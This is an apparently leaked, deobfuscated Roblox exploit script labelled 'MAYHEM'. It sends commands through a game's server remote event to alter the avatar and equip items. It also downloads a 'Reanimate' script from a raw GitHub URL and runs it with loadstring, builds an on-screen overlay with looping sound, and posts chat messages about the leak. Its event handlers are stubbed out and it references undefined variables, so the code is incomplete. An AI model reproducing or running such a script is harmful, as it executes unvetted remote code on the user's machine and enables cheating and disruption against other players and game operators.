-- Unobfuscated By Azazel Deobfuscator

local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local TextChatService = game:GetService("TextChatService")

local lp = Players.LocalPlayer

local _01_server = game:GetService("ReplicatedStorage"):WaitForChild("01_server")
_01_server:FireServer("cmd", "-rs")
_01_server:FireServer("cmd", "-r6")
_01_server:FireServer("cmd", "-gh 5316479641 5316539421 5699795428 5316549755 5268602207 5268555719 82742704984803")
_01_server:FireServer("cmd", "-sh")
_01_server:FireServer("cmd", "-net")

loadstring(game:HttpGet("https://raw.githubusercontent.com/oldhacfard/The-script/refs/heads/main/Reanimate.luau"))()

local circleOverlay = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local sound = Instance.new("Sound")
local imageLabel = Instance.new("ImageLabel")
local imageLabel_2 = Instance.new("ImageLabel")
local imageLabel_3 = Instance.new("ImageLabel")
local imageLabel_4 = Instance.new("ImageLabel")
local textLabel = Instance.new("TextLabel")
local uIGradient = Instance.new("UIGradient")
local imageLabel_5 = Instance.new("ImageLabel")
local frame_2 = Instance.new("Frame")
local uICorner = Instance.new("UICorner")
local textLabel_2 = Instance.new("TextLabel")
local textButton = Instance.new("TextButton")
local textLabel_3 = Instance.new("TextLabel")
local textButton_2 = Instance.new("TextButton")
local textLabel_4 = Instance.new("TextLabel")
local textButton_3 = Instance.new("TextButton")
local textLabel_5 = Instance.new("TextLabel")
local mayhemGui = Instance.new("BillboardGui")
local textLabel_6 = Instance.new("TextLabel")
local uIGradient_2 = Instance.new("UIGradient")

circleOverlay.Name = "CircleOverlay"
circleOverlay.IgnoreGuiInset = true
circleOverlay.DisplayOrder = 999999
circleOverlay.ScreenInsets = Enum.ScreenInsets.None

frame.Size = UDim2.new(1,500,1,500)
frame.Position = UDim2.new(0.5,0,0.5,0)
frame.AnchorPoint = Vector2.new(0.5,0.5)
frame.BackgroundColor3 = Color3.fromRGB(0,0,0)
frame.BorderSizePixel = 0
TweenService:Create(frame, TweenInfo.new(1), {BackgroundTransparency=1}):Play()

sound.SoundId = "rbxassetid://120792622724084"
sound.Looped = true
sound.Volume = 2

imageLabel.BackgroundTransparency = 1
imageLabel.Image = "rbxassetid://79526458553971"
imageLabel.Size = UDim2.new(0,250,0,250)
imageLabel.Position = UDim2.new(1,0,1,0)
imageLabel.AnchorPoint = Vector2.new(0.5,0.5)
imageLabel.ImageColor3 = Color3.fromRGB(255,0,0)

imageLabel_2.BackgroundTransparency = 1
imageLabel_2.Image = "rbxassetid://79526458553971"
imageLabel_2.Size = UDim2.new(0,150,0,150)
imageLabel_2.Position = UDim2.new(0.5,0,0,0)
imageLabel_2.AnchorPoint = Vector2.new(0.5,0.5)
imageLabel_2.ImageColor3 = Color3.fromRGB(255,0,0)

imageLabel_3.BackgroundTransparency = 1
imageLabel_3.Image = "rbxassetid://78288185895922"
imageLabel_3.Size = UDim2.new(0.3,0,0.4,0)
imageLabel_3.Position = UDim2.new(0,0,0.8,0)
imageLabel_3.AnchorPoint = Vector2.new(0.5,0.5)
imageLabel_3.ImageColor3 = Color3.fromRGB(255,0,0)
imageLabel_3.Rotation = 180

imageLabel_4.BackgroundTransparency = 1
imageLabel_4.Image = "rbxassetid://78288185895922"
imageLabel_4.Size = UDim2.new(0.3,0,0.4,0)
imageLabel_4.Position = UDim2.new(0.9,0,0,0)
imageLabel_4.AnchorPoint = Vector2.new(0.5,0.5)
imageLabel_4.ImageColor3 = Color3.fromRGB(255,0,0)

textLabel.AnchorPoint = Vector2.new(0.5,0.5)
textLabel.BackgroundTransparency = 1
textLabel.Text = "MAYHEM"
textLabel.Font = Enum.Font.Antique
textLabel.TextSize = 50
textLabel.Rotation = -5

uIGradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(255,0,0)),ColorSequenceKeypoint.new(1,Color3.fromRGB(0,0,0))})

imageLabel_5.BackgroundTransparency = 1
imageLabel_5.Image = "rbxassetid://6805220123"
imageLabel_5.Size = UDim2.new(1,0,1,0)
imageLabel_5.Position = UDim2.new(0.5,0,0.5,0)
imageLabel_5.AnchorPoint = Vector2.new(0.5,0.5)
imageLabel_5.ImageColor3 = Color3.fromRGB(0,0,0)
imageLabel_5.ScaleType = Enum.ScaleType.Stretch

frame_2.Size = UDim2.new(0,130,0,28)
frame_2.Position = UDim2.new(0.1,0,0.9,0)
frame_2.AnchorPoint = Vector2.new(0.5,0.5)
frame_2.BackgroundColor3 = Color3.fromRGB(0,0,0)
frame_2.BackgroundTransparency = 0.5
frame_2.BorderSizePixel = 0

uICorner.CornerRadius = UDim.new(0,4)

textLabel_2.Size = UDim2.new(1,0,1,0)
textLabel_2.BackgroundTransparency = 1
textLabel_2.Text = "Mode: Mayhem"
textLabel_2.TextColor3 = Color3.fromRGB(255,0,0)
textLabel_2.Font = Enum.Font.Antique
textLabel_2.TextSize = 20

textButton.Size = UDim2.new(0,35,0,35)
textButton.Position = UDim2.new(0.9,0,0.1,0)
textButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
textButton.BackgroundTransparency = 0.3
textButton.BorderSizePixel = 2
textButton.BorderColor3 = Color3.fromRGB(0,0,0)
textButton.Rotation = 45

textLabel_3.Size = UDim2.new(1,0,1,0)
textLabel_3.BackgroundTransparency = 1
textLabel_3.Rotation = -45
textLabel_3.Text = "Q"
textLabel_3.TextColor3 = Color3.fromRGB(255,0,0)
textLabel_3.TextSize = 30
textLabel_3.Font = Enum.Font.Antique

textButton_2.Size = UDim2.new(0,35,0,35)
textButton_2.Position = UDim2.new(0.9,0,0.3,0)
textButton_2.BackgroundColor3 = Color3.fromRGB(0,0,0)
textButton_2.BackgroundTransparency = 0.3
textButton_2.BorderSizePixel = 2
textButton_2.BorderColor3 = Color3.fromRGB(0,0,0)
textButton_2.Rotation = 45

textLabel_4.Size = UDim2.new(1,0,1,0)
textLabel_4.BackgroundTransparency = 1
textLabel_4.Rotation = -45
textLabel_4.Text = "E"
textLabel_4.TextColor3 = Color3.fromRGB(255,255,255)
textLabel_4.TextSize = 30
textLabel_4.Font = Enum.Font.Antique

textButton_3.Size = UDim2.new(0,35,0,35)
textButton_3.Position = UDim2.new(0.9,0,0.5,0)
textButton_3.BackgroundColor3 = Color3.fromRGB(0,0,0)
textButton_3.BackgroundTransparency = 0.3
textButton_3.BorderSizePixel = 2
textButton_3.BorderColor3 = Color3.fromRGB(0,0,0)
textButton_3.Rotation = 45

textLabel_5.Size = UDim2.new(1,0,1,0)
textLabel_5.BackgroundTransparency = 1
textLabel_5.Rotation = -45
textLabel_5.Text = "R"
textLabel_5.TextColor3 = Color3.fromRGB(255,244,114)
textLabel_5.TextSize = 30
textLabel_5.Font = Enum.Font.Antique

mayhemGui.Name = "MayhemGui"
mayhemGui.Size = UDim2.new(0,200,0,50)
mayhemGui.Adornee = head
mayhemGui.StudsOffset = Vector3.new(0,3,0)
mayhemGui.AlwaysOnTop = true

textLabel_6.Size = UDim2.new(1,0,1,0)
textLabel_6.BackgroundTransparency = 1
textLabel_6.Text = "MAYHEM"
textLabel_6.Font = Enum.Font.Antique
textLabel_6.TextSize = 45
textLabel_6.TextColor3 = Color3.fromRGB(255,255,255)
textLabel_6.TextStrokeTransparency = 0
textLabel_6.TextStrokeColor3 = Color3.fromRGB(0,0,0)

uIGradient_2.Color = ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(255,0,0)),ColorSequenceKeypoint.new(1,Color3.fromRGB(0,0,0))})
uIGradient_2.Rotation = 90

-- parent assignments
circleOverlay.Parent = lp.PlayerGui
frame.Parent = circleOverlay
sound.Parent = hrp
imageLabel.Parent = circleOverlay
imageLabel_2.Parent = circleOverlay
imageLabel_3.Parent = circleOverlay
imageLabel_4.Parent = circleOverlay
textLabel.Parent = circleOverlay
uIGradient.Parent = textLabel
imageLabel_5.Parent = circleOverlay
frame_2.Parent = circleOverlay
uICorner.Parent = frame_2
textLabel_2.Parent = frame_2
textButton.Parent = circleOverlay
textLabel_3.Parent = textButton
textButton_2.Parent = circleOverlay
textLabel_4.Parent = textButton_2
textButton_3.Parent = circleOverlay
textLabel_5.Parent = textButton_3
mayhemGui.Parent = head
textLabel_6.Parent = mayhemGui
uIGradient_2.Parent = textLabel_6

-- event connections
-- inst_10.InputBegan:Connect(function() end)
-- textButton.MouseButton1Click:Connect(function() end)
-- textButton_2.MouseButton1Click:Connect(function() end)
-- textButton_3.MouseButton1Click:Connect(function() end)
-- inst_11.Stepped:Connect(function() end)
-- inst_11.Heartbeat:Connect(function() end)
-- inst_17.Died:Connect(function() end)

task.wait(2)
pcall(function()
    local general = TextChatService.TextChannels:WaitForChild("RBXGeneral", 5)
    general:SendAsync("Exire Has Leaked This Script. So, Just Use It Anyway")
    general:SendAsync("C00l_Ch4os")
end)
